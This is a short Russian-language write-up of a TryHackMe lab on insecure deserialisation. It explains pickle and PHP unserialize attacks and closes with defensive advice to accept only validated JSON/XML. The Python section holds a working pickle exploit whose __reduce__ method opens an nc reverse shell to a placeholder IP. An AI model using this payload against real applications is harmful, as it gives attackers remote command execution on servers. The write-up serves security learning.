# Insecure Deserialisation: доверие к мёртвым объектам

**Машина:** [Insecure Deserialisation](https://tryhackme.com/room/insecuredeserialisation) (medium, web)
**Суть:** приложение принимает сериализованные объекты от юзера и «оживляет» их без проверки. Это RCE во всех языках сразу.

## База

Сериализация — упаковка объекта в поток байт, десериализация — обратный процесс. Опасность в том, что десериализация **исполняет код объекта**: конструкторы, магические методы, геттеры. Если поток пришёл от атакующего — исполнится то, что он вложил.

## Python: pickle

```python
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc IP 4444 >/tmp/f',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
```

`__reduce__` говорит pickle, как восстановить объект — мы просим вызвать `os.system` с нашей командой. Приложение делает `pickle.loads(base64.b64decode(input))` — шелл.

## PHP: unserialize

`unserialize()` на пользовательском вводе + класс с `__wakeup()` или `__destruct()` = код внутри магического метода. Цепочки гаджетов (POP chains) собираются из классов, которые лежат рядом — инструменты: `phpggc`.

## Почему это везде

Java (Serializable, ysoserial), .NET (BinaryFormatter — официально не рекомендован), Ruby (Marshal), PHP, Python (pickle). Паттерн один: «десериализуй что прислали» — и любой из них даёт RCE.

## Заметка

Правило, которое теперь проверяю первым: никогда не принимать сериализованные объекты от клиента. Нужен обмен данными — JSON/XML с валидацией схемы. Если pickle/unserialize на входе вижу в коде — это почти всегда находка уровня critical.
